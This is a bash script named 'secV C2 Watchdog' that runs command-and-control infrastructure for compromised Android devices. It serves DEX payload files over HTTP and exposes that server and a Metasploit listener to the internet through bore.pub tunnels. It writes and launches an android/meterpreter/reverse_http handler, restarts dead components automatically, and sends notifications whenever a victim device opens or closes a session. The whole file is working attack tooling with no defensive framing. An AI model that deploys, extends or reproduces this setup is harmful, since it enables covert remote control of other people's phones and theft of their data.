#!/usr/bin/env bash
# secV C2 Watchdog
# Manages: DEX HTTP server | bore DEX tunnel | bore MSF tunnel | MSF handler
# Watches: meterpreter sessions — logs device ON/OFF, sends desktop notification
#
# Usage: bash c2_watchdog.sh [--dex-port 8080] [--bore-dex-port 21062]
#                             [--bore-msf-port 37993] [--msf-port 4444]
#                             [--dex-dir /path/to/dex] [--notify]

set -uo pipefail

# ── Config (override via env or args) ────────────────────────────────────────
BORE_BIN="${BORE_BIN:-$(command -v bore 2>/dev/null || echo /usr/local/bin/bore)}"
BORE_SERVER="${BORE_SERVER:-bore.pub}"
BORE_DEX_PORT="${BORE_DEX_PORT:-21062}"
BORE_MSF_PORT="${BORE_MSF_PORT:-37993}"
DEX_HTTP_PORT="${DEX_HTTP_PORT:-8080}"
MSF_LPORT="${MSF_LPORT:-4444}"
DEX_SERVE_DIR="${DEX_SERVE_DIR:-$(dirname "$(realpath "$0")")}"
LOG_DIR="${LOG_DIR:-/tmp/secv-c2}"
NOTIFY="${NOTIFY:-false}"

# Parse args
while [[ $# -gt 0 ]]; do
    case $1 in
        --dex-port)     DEX_HTTP_PORT="$2";  shift 2 ;;
        --bore-dex-port) BORE_DEX_PORT="$2"; shift 2 ;;
        --bore-msf-port) BORE_MSF_PORT="$2"; shift 2 ;;
        --msf-port)     MSF_LPORT="$2";      shift 2 ;;
        --dex-dir)      DEX_SERVE_DIR="$2";  shift 2 ;;
        --notify)       NOTIFY="true";       shift ;;
        *) shift ;;
    esac
done

mkdir -p "$LOG_DIR"

BORE_DEX_LOG="$LOG_DIR/bore_dex.log"
BORE_MSF_LOG="$LOG_DIR/bore_msf.log"
MSF_LOG="$LOG_DIR/msf.log"
SESSION_LOG="$LOG_DIR/sessions.log"
DEX_LOG="$LOG_DIR/dex_server.log"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'; RST='\033[0m'
ts()   { date '+%Y-%m-%d %H:%M:%S'; }
info() { echo -e "$(ts) ${CYN}[*]${RST} $*"; }
ok()   { echo -e "$(ts) ${GRN}[+]${RST} $*"; }
warn() { echo -e "$(ts) ${YLW}[!]${RST} $*"; }

notify() {
    local msg="$1"
    [ "$NOTIFY" = "true" ] && command -v notify-send &>/dev/null && notify-send "secV C2" "$msg" 2>/dev/null || true
    echo "$(ts) NOTIFY: $msg" >> "$SESSION_LOG"
}

# ── Process management ────────────────────────────────────────────────────────
DEX_PID=""
BORE_DEX_PID=""
BORE_MSF_PID=""
MSF_PID=""

cleanup() {
    info "Shutting down secV C2..."
    [ -n "$DEX_PID"      ] && kill "$DEX_PID"      2>/dev/null || true
    [ -n "$BORE_DEX_PID" ] && kill "$BORE_DEX_PID" 2>/dev/null || true
    [ -n "$BORE_MSF_PID" ] && kill "$BORE_MSF_PID" 2>/dev/null || true
    [ -n "$MSF_PID"      ] && kill "$MSF_PID"       2>/dev/null || true
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

start_dex_server() {
    if [ -n "$DEX_PID" ] && kill -0 "$DEX_PID" 2>/dev/null; then return; fi
    info "Starting DEX HTTP server on :$DEX_HTTP_PORT (serving $DEX_SERVE_DIR)..."
    python3 -m http.server "$DEX_HTTP_PORT" --directory "$DEX_SERVE_DIR" > "$DEX_LOG" 2>&1 &
    DEX_PID=$!
    ok "DEX server PID: $DEX_PID"
}

start_bore_dex() {
    if [ -n "$BORE_DEX_PID" ] && kill -0 "$BORE_DEX_PID" 2>/dev/null; then return; fi
    if [ ! -x "$BORE_BIN" ]; then warn "bore not found at $BORE_BIN"; return; fi
    info "Starting bore DEX tunnel → $BORE_SERVER:$BORE_DEX_PORT..."
    "$BORE_BIN" local "$DEX_HTTP_PORT" --to "$BORE_SERVER" --port "$BORE_DEX_PORT" > "$BORE_DEX_LOG" 2>&1 &
    BORE_DEX_PID=$!
    ok "bore DEX PID: $BORE_DEX_PID — bore.pub:$BORE_DEX_PORT → :$DEX_HTTP_PORT"
}

start_bore_msf() {
    if [ -n "$BORE_MSF_PID" ] && kill -0 "$BORE_MSF_PID" 2>/dev/null; then return; fi
    if [ ! -x "$BORE_BIN" ]; then warn "bore not found at $BORE_BIN"; return; fi
    info "Starting bore MSF tunnel → $BORE_SERVER:$BORE_MSF_PORT..."
    "$BORE_BIN" local "$MSF_LPORT" --to "$BORE_SERVER" --port "$BORE_MSF_PORT" > "$BORE_MSF_LOG" 2>&1 &
    BORE_MSF_PID=$!
    ok "bore MSF PID: $BORE_MSF_PID — bore.pub:$BORE_MSF_PORT → :$MSF_LPORT"
}

write_handler_rc() {
    cat > "$LOG_DIR/handler.rc" << RC
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_http
set LHOST 0.0.0.0
set LPORT $MSF_LPORT
set ExitOnSession false
run
RC
}

start_msf() {
    if [ -n "$MSF_PID" ] && kill -0 "$MSF_PID" 2>/dev/null; then return; fi
    if ! command -v msfconsole &>/dev/null; then warn "msfconsole not found"; return; fi

    # Wait for port to be free
    local retries=5
    while ss -tlnp | grep -q ":$MSF_LPORT" && [ $retries -gt 0 ]; do
        warn "Port $MSF_LPORT busy — waiting..."
        sleep 2
        (( retries-- ))
    done

    write_handler_rc
    info "Starting MSF handler on :$MSF_LPORT..."
    msfconsole -q -r "$LOG_DIR/handler.rc" > "$MSF_LOG" 2>&1 &
    MSF_PID=$!
    ok "MSF PID: $MSF_PID"
}

# ── Session detection ─────────────────────────────────────────────────────────
LAST_SESSION_COUNT=0

check_sessions() {
    if [ ! -f "$MSF_LOG" ]; then return; fi

    local count
    count=$(grep -c "Meterpreter session.*opened" "$MSF_LOG" 2>/dev/null || echo 0)

    if [ "$count" -gt "$LAST_SESSION_COUNT" ]; then
        local diff=$(( count - LAST_SESSION_COUNT ))
        ok "*** $diff NEW SESSION(S) OPENED *** (total: $count)"
        notify "Device connected! Session $count opened"
        # Log session details
        grep "Meterpreter session.*opened" "$MSF_LOG" | tail -"$diff" >> "$SESSION_LOG"
        LAST_SESSION_COUNT="$count"
    fi

    # Check for session closes
    if grep -q "Meterpreter session.*closed" "$MSF_LOG" 2>/dev/null; then
        local closed_count
        closed_count=$(grep -c "Meterpreter session.*closed" "$MSF_LOG" 2>/dev/null || echo 0)
        if [ "$closed_count" -ne "$(cat "$LOG_DIR/.last_closed" 2>/dev/null || echo 0)" ]; then
            warn "*** SESSION CLOSED *** — device may have disconnected or rebooted"
            notify "Device disconnected (session closed)"
            echo "$closed_count" > "$LOG_DIR/.last_closed"
        fi
    fi
}

health_check() {
    # Restart dead processes
    if [ -n "$DEX_PID" ] && ! kill -0 "$DEX_PID" 2>/dev/null; then
        warn "DEX server died — restarting..."
        start_dex_server
    fi
    if [ -n "$BORE_DEX_PID" ] && ! kill -0 "$BORE_DEX_PID" 2>/dev/null; then
        warn "bore DEX tunnel died — restarting..."
        start_bore_dex
    fi
    if [ -n "$BORE_MSF_PID" ] && ! kill -0 "$BORE_MSF_PID" 2>/dev/null; then
        warn "bore MSF tunnel died — restarting..."
        start_bore_msf
    fi
    if [ -n "$MSF_PID" ] && ! kill -0 "$MSF_PID" 2>/dev/null; then
        warn "MSF handler died — restarting..."
        start_msf
    fi
}

# ── Main loop ─────────────────────────────────────────────────────────────────
info "secV C2 Watchdog starting..."
info "  DEX serve dir:  $DEX_SERVE_DIR"
info "  Bore server:    $BORE_SERVER"
info "  bore DEX port:  $BORE_DEX_PORT"
info "  bore MSF port:  $BORE_MSF_PORT"
info "  MSF LPORT:      $MSF_LPORT"
info "  Logs:           $LOG_DIR"
echo ""

start_dex_server
sleep 1
start_bore_dex
start_bore_msf
sleep 2
start_msf

info "All services started. Monitoring for sessions..."

while true; do
    sleep 5
    health_check
    check_sessions
done
